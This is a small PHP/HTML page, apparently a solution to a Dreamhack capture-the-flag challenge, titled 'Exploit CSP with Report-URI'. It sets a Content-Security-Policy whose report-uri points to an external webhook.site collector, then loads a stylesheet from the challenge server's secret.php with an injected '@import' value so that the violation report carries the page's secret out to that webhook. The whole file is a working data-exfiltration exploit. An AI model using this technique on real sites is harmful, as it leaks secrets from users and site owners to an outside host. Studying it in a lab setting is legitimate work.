<?php
header("Content-Security-Policy: default-src 'self'; style-src 'self'; report-uri https://webhook.site/2b0e8e28-cd46-4434-b0d0-eb7f190b7ed7;");
?>

<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Exploit CSP with Report-URI</title>
    <!-- Tải file CSS chứa nội dung `$secret` -->
    <link rel="stylesheet" href="http://host3.dreamhack.games:15346/secret.php?whatUwant=@import '">
</head>
<body>
    <h1>Exploitation in Progress...</h1>
</body>
</html>
